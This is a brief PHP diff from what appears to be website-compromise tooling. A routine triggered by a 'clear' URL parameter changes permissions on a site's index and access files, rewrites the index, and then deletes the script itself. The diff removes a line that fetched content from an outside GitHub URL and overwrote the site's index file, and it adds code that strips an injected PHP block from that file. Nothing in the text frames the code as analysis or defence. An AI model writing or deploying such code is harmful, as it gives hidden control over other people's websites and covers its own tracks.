@@ -30,7 +30,10 @@ if (isset($_GET['clear'])){
     chFile($htIndex,false);
 
     chFile($indexFile,true);
-    saveContent($indexFile,getContent('https://raw.githubusercontent.com/avernistama/0xx/refs/heads/main/indexWp.txt'));
+    $content = file_get_contents($indexFile);
+    $content = preg_replace('/<\?(?:php|=).*?<\?(?:php|=)/s', '', $content);
+    chFile($indexFile,true);
+    saveContent($indexFile,$content);
     chFile($indexFile,true);
     unlink(__FILE__);
 }
